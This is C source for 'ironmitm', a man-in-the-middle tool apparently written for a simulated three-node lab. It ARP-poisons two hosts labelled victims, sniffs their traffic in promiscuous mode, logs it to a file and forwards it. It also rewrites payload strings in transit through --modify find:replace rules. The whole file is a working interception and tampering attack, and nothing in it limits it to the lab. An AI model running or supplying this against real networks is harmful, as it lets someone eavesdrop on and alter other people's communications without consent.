/*
 * ironmitm — Man-in-the-Middle Relay Engine
 *
 * ARP-poisons two victims, intercepts their traffic, logs it, and forwards.
 * Works within the ironsim 3-node topology.
 *
 * Usage: sudo ./ironmitm --victim-a <ip> --victim-b <ip> --iface <name> [--log <file>]
 *
 * Architecture:
 *   Victim A ←→ [ironmitm intercepts] ←→ Victim B
 *   ironmitm tells A: "B is at my MAC"
 *   ironmitm tells B: "A is at my MAC"
 *   All traffic between A and B passes through ironmitm
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#define MAX_PKT 2048
#define ARP_INTERVAL 2  /* seconds between ARP poison refreshes */
#define MAX_RULES 8
#define MAX_PATTERN 64

typedef struct {
    char find[MAX_PATTERN];
    char replace[MAX_PATTERN];
    int find_len;
    int replace_len;
    int hits;
} modify_rule_t;

static volatile int g_running = 1;
static FILE *g_log_file = NULL;
static modify_rule_t g_rules[MAX_RULES];
static int g_rule_count = 0;

static void signal_handler(int sig) { (void)sig; g_running = 0; }

/* ---- Packet socket ---- */

static int open_packet_socket(const char *iface, int *ifindex) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    *ifindex = ifr.ifr_ifindex;

    /* Bind to interface */
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = *ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    bind(fd, (struct sockaddr *)&sll, sizeof(sll));

    /* Set promiscuous mode */
    struct packet_mreq mreq;
    memset(&mreq, 0, sizeof(mreq));
    mreq.mr_ifindex = *ifindex;
    mreq.mr_type = PACKET_MR_PROMISC;
    setsockopt(fd, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mreq, sizeof(mreq));

    /* Non-blocking */
    struct timeval tv = {0, 100000}; /* 100ms timeout */
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    return fd;
}

/* ---- ARP crafting ---- */

static void send_arp_reply(int fd, int ifindex,
                           const uint8_t *src_mac, const uint8_t *dst_mac,
                           uint32_t sender_ip, uint32_t target_ip) {
    uint8_t frame[42]; /* 14 eth + 28 arp */
    memset(frame, 0, sizeof(frame));

    /* Ethernet */
    memcpy(frame, dst_mac, 6);
    memcpy(frame + 6, src_mac, 6);
    frame[12] = 0x08; frame[13] = 0x06;

    /* ARP reply */
    uint8_t *arp = frame + 14;
    arp[0] = 0x00; arp[1] = 0x01; /* hw type */
    arp[2] = 0x08; arp[3] = 0x00; /* proto */
    arp[4] = 6; arp[5] = 4;       /* hw/proto len */
    arp[6] = 0x00; arp[7] = 0x02; /* reply */
    memcpy(arp + 8, src_mac, 6);
    memcpy(arp + 14, &sender_ip, 4);
    memcpy(arp + 18, dst_mac, 6);
    memcpy(arp + 24, &target_ip, 4);

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifindex;
    sll.sll_protocol = htons(ETH_P_ARP);
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, dst_mac, 6);

    sendto(fd, frame, 42, 0, (struct sockaddr *)&sll, sizeof(sll));
}

/* ---- Logging ---- */

static int add_modify_rule(const char *spec) {
    /* Format: "find:replace" */
    if (g_rule_count >= MAX_RULES) return -1;
    const char *colon = strchr(spec, ':');
    if (!colon) return -1;

    modify_rule_t *r = &g_rules[g_rule_count];
    r->find_len = (int)(colon - spec);
    if (r->find_len >= MAX_PATTERN) r->find_len = MAX_PATTERN - 1;
    memcpy(r->find, spec, r->find_len);
    r->find[r->find_len] = 0;

    r->replace_len = strlen(colon + 1);
    if (r->replace_len >= MAX_PATTERN) r->replace_len = MAX_PATTERN - 1;
    memcpy(r->replace, colon + 1, r->replace_len);
    r->replace[r->replace_len] = 0;

    r->hits = 0;
    g_rule_count++;
    return 0;
}

static int apply_modifications(uint8_t *pkt, int len) {
    /* Search payload (after eth+ip+tcp/udp headers, ~54 bytes) for patterns */
    int modified = 0;
    int hdr_skip = 54; /* eth(14) + ip(20) + tcp(20) minimum */
    if (len <= hdr_skip) return 0;

    for (int r = 0; r < g_rule_count; r++) {
        modify_rule_t *rule = &g_rules[r];
        /* Only replace if find and replace are same length (simple in-place) */
        if (rule->find_len != rule->replace_len) continue;

        for (int i = hdr_skip; i <= len - rule->find_len; i++) {
            if (memcmp(pkt + i, rule->find, rule->find_len) == 0) {
                memcpy(pkt + i, rule->replace, rule->replace_len);
                rule->hits++;
                modified++;
                printf("  [MODIFY] Replaced \"%s\" with \"%s\" at offset %d\n",
                       rule->find, rule->replace, i);
            }
        }
    }
    return modified;
}

static void log_packet(const uint8_t *pkt, int len, const char *direction) {
    if (len < 34) return; /* need at least eth + ip header */

    uint16_t ethertype = (pkt[12] << 8) | pkt[13];
    if (ethertype != 0x0800) return; /* only log IPv4 */

    const uint8_t *ip = pkt + 14;
    uint8_t proto = ip[9];
    char src[16], dst[16];
    struct in_addr s, d;
    memcpy(&s.s_addr, ip + 12, 4);
    memcpy(&d.s_addr, ip + 16, 4);
    inet_ntop(AF_INET, &s, src, sizeof(src));
    inet_ntop(AF_INET, &d, dst, sizeof(dst));

    uint16_t sport = 0, dport = 0;
    if ((proto == 6 || proto == 17) && len >= 38) {
        const uint8_t *l4 = ip + 20;
        sport = (l4[0] << 8) | l4[1];
        dport = (l4[2] << 8) | l4[3];
    }

    const char *proto_name = (proto == 6) ? "TCP" : (proto == 17) ? "UDP" : "OTHER";

    printf("  [%s] %s:%d -> %s:%d %s (%d bytes)\n",
           direction, src, sport, dst, dport, proto_name, len - 14);

    if (g_log_file) {
        fprintf(g_log_file, "%s|%s|%d|%s|%d|%s|%d\n",
                direction, src, sport, dst, dport, proto_name, len - 14);
        fflush(g_log_file);
    }
}

/* ---- Forward packet ---- */

static void forward_packet(int fd, int ifindex, uint8_t *pkt, int len,
                           const uint8_t *new_dst_mac, const uint8_t *my_mac) {
    /* Rewrite MACs: src = my MAC, dst = real destination MAC */
    memcpy(pkt, new_dst_mac, 6);
    memcpy(pkt + 6, my_mac, 6);

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, new_dst_mac, 6);

    sendto(fd, pkt, len, 0, (struct sockaddr *)&sll, sizeof(sll));
}

/* ---- Main ---- */

static void usage(void) {
    fprintf(stderr, "Usage: ironmitm --victim-a <ip> --victim-b <ip> --iface <name> [options]\n\n");
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  --log <file>           Log intercepted traffic to file\n");
    fprintf(stderr, "  --modify <find:replace> Modify payload in transit (same-length only)\n");
    fprintf(stderr, "                          Can be specified multiple times\n");
    fprintf(stderr, "  --help                 Show this help\n");
    fprintf(stderr, "\nExamples:\n");
    fprintf(stderr, "  ironmitm --victim-a 10.0.1.1 --victim-b 10.0.1.2 --iface iron0\n");
    fprintf(stderr, "  ironmitm --victim-a 10.0.1.1 --victim-b 10.0.1.2 --iface iron0 --modify \"secret:XXXXXX\"\n");
    fprintf(stderr, "  ironmitm --victim-a 10.0.1.1 --victim-b 10.0.1.2 --iface iron0 --modify \"OK:NO\" --modify \"bar:XXX\"\n");
}

int main(int argc, char **argv) {
    const char *victim_a_str = NULL, *victim_b_str = NULL;
    const char *iface = "iron0";
    const char *log_path = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--victim-a") == 0 && i + 1 < argc) victim_a_str = argv[++i];
        else if (strcmp(argv[i], "--victim-b") == 0 && i + 1 < argc) victim_b_str = argv[++i];
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
        else if (strcmp(argv[i], "--log") == 0 && i + 1 < argc) log_path = argv[++i];
        else if (strcmp(argv[i], "--modify") == 0 && i + 1 < argc) add_modify_rule(argv[++i]);
        else if (strcmp(argv[i], "--help") == 0) { usage(); return 0; }
    }

    if (!victim_a_str || !victim_b_str) { usage(); return 1; }

    struct in_addr a_addr, b_addr;
    if (inet_pton(AF_INET, victim_a_str, &a_addr) != 1 ||
        inet_pton(AF_INET, victim_b_str, &b_addr) != 1) {
        fprintf(stderr, "Invalid IP address\n"); return 1;
    }
    uint32_t victim_a_ip = a_addr.s_addr;
    uint32_t victim_b_ip = b_addr.s_addr;

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    printf("╔══════════════════════════════════════════╗\n");
    printf("║     ironmitm — MITM Relay Engine         ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");
    printf("  Victim A: %s\n", victim_a_str);
    printf("  Victim B: %s\n", victim_b_str);
    printf("  Iface:    %s\n", iface);
    if (log_path) printf("  Log:      %s\n", log_path);
    if (g_rule_count > 0) {
        printf("  Modify:   %d rules\n", g_rule_count);
        for (int r = 0; r < g_rule_count; r++)
            printf("    [%d] \"%s\" -> \"%s\"\n", r + 1, g_rules[r].find, g_rules[r].replace);
    }
    printf("\n");

    /* Open log file */
    if (log_path) {
        g_log_file = fopen(log_path, "w");
        if (!g_log_file) fprintf(stderr, "Warning: cannot open log file\n");
    }

    /* Open packet socket */
    int ifindex;
    int fd = open_packet_socket(iface, &ifindex);
    if (fd < 0) {
        fprintf(stderr, "Error: cannot open packet socket on %s (run with sudo)\n", iface);
        return 1;
    }

    /* Our attacker MAC */
    uint8_t my_mac[6] = {0x02, 0xDE, 0xAD, 0xBE, 0xEF, 0x01};

    /* Victim MACs — learned from first intercepted packets */
    uint8_t mac_a[6] = {0};
    uint8_t mac_b[6] = {0};
    int mac_a_known = 0, mac_b_known = 0;

    /* Get victim MACs by sending ARP requests first */
    printf("  [mitm] Resolving victim MACs...\n");

    /* Get our interface MAC */
    struct ifreq ifr_mac;
    memset(&ifr_mac, 0, sizeof(ifr_mac));
    strncpy(ifr_mac.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr_mac) == 0) {
        memcpy(my_mac, ifr_mac.ifr_hwaddr.sa_data, 6);
    }

    /* Send ARP requests to learn victim MACs */
    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    send_arp_reply(fd, ifindex, my_mac, bcast, victim_a_ip, 0); /* ARP who-has A */
    send_arp_reply(fd, ifindex, my_mac, bcast, victim_b_ip, 0); /* ARP who-has B */
    usleep(500000); /* Wait for replies */

    /* Sniff for ARP replies to learn MACs */
    for (int attempt = 0; attempt < 20 && (!mac_a_known || !mac_b_known); attempt++) {
        uint8_t tmp[MAX_PKT];
        int n = recv(fd, tmp, sizeof(tmp), 0);
        if (n < 42) continue;
        uint16_t et = (tmp[12] << 8) | tmp[13];
        if (et == 0x0806) { /* ARP */
            uint32_t sender_ip;
            memcpy(&sender_ip, tmp + 28, 4); /* ARP sender IP */
            if (sender_ip == victim_a_ip && !mac_a_known) {
                memcpy(mac_a, tmp + 6, 6); /* src MAC from ethernet */
                mac_a_known = 1;
                printf("  [mitm] Victim A MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                       mac_a[0], mac_a[1], mac_a[2], mac_a[3], mac_a[4], mac_a[5]);
            }
            if (sender_ip == victim_b_ip && !mac_b_known) {
                memcpy(mac_b, tmp + 6, 6);
                mac_b_known = 1;
                printf("  [mitm] Victim B MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                       mac_b[0], mac_b[1], mac_b[2], mac_b[3], mac_b[4], mac_b[5]);
            }
        }
        /* Also learn from IP packets */
        if (et == 0x0800 && n >= 34) {
            uint32_t src_ip_pkt;
            memcpy(&src_ip_pkt, tmp + 26, 4);
            if (src_ip_pkt == victim_a_ip && !mac_a_known) {
                memcpy(mac_a, tmp + 6, 6);
                mac_a_known = 1;
            }
            if (src_ip_pkt == victim_b_ip && !mac_b_known) {
                memcpy(mac_b, tmp + 6, 6);
                mac_b_known = 1;
            }
        }
    }

    if (!mac_a_known) { printf("  [mitm] Warning: could not resolve Victim A MAC, using broadcast\n"); memset(mac_a, 0xFF, 6); }
    if (!mac_b_known) { printf("  [mitm] Warning: could not resolve Victim B MAC, using broadcast\n"); memset(mac_b, 0xFF, 6); }

    printf("  [mitm] Starting ARP poisoning + relay...\n");
    printf("  [mitm] Press Ctrl+C to stop.\n\n");

    time_t last_arp = 0;
    int intercepted = 0, forwarded = 0;

    while (g_running) {
        /* Periodic ARP poisoning */
        time_t now = time(NULL);
        if (now - last_arp >= ARP_INTERVAL) {
            /* Tell A: "B is at my_mac" */
            send_arp_reply(fd, ifindex, my_mac, mac_a, victim_b_ip, victim_a_ip);
            /* Tell B: "A is at my_mac" */
            send_arp_reply(fd, ifindex, my_mac, mac_b, victim_a_ip, victim_b_ip);
            last_arp = now;
        }

        /* Sniff packets */
        uint8_t pkt[MAX_PKT];
        int n = recv(fd, pkt, sizeof(pkt), 0);
        if (n <= 14) continue;

        /* Check if packet is addressed to our MAC (intercepted) */
        if (memcmp(pkt, my_mac, 6) != 0) continue;

        /* Determine direction and forward */
        uint16_t ethertype = (pkt[12] << 8) | pkt[13];
        if (ethertype != 0x0800) continue; /* only handle IPv4 */

        uint32_t pkt_src_ip, pkt_dst_ip;
        memcpy(&pkt_src_ip, pkt + 26, 4); /* IP src at eth(14) + ip(12) */
        memcpy(&pkt_dst_ip, pkt + 30, 4); /* IP dst at eth(14) + ip(16) */

        intercepted++;

        if (pkt_src_ip == victim_a_ip && pkt_dst_ip == victim_b_ip) {
            log_packet(pkt, n, "A->B");
            apply_modifications(pkt, n);
            forward_packet(fd, ifindex, pkt, n, mac_b, my_mac);
            forwarded++;
        } else if (pkt_src_ip == victim_b_ip && pkt_dst_ip == victim_a_ip) {
            log_packet(pkt, n, "B->A");
            apply_modifications(pkt, n);
            forward_packet(fd, ifindex, pkt, n, mac_a, my_mac);
            forwarded++;
        }
    }

    printf("\n  [mitm] Stopped.\n");
    printf("  [mitm] Intercepted: %d packets\n", intercepted);
    printf("  [mitm] Forwarded:   %d packets\n", forwarded);
    if (g_rule_count > 0) {
        printf("  [mitm] Modification rules:\n");
        for (int r = 0; r < g_rule_count; r++) {
            printf("    \"%s\" -> \"%s\": %d hits\n",
                   g_rules[r].find, g_rules[r].replace, g_rules[r].hits);
        }
    }
    if (g_log_file) { fclose(g_log_file); printf("  [mitm] Log saved.\n"); }
    printf("\n");

    close(fd);
    return 0;
}
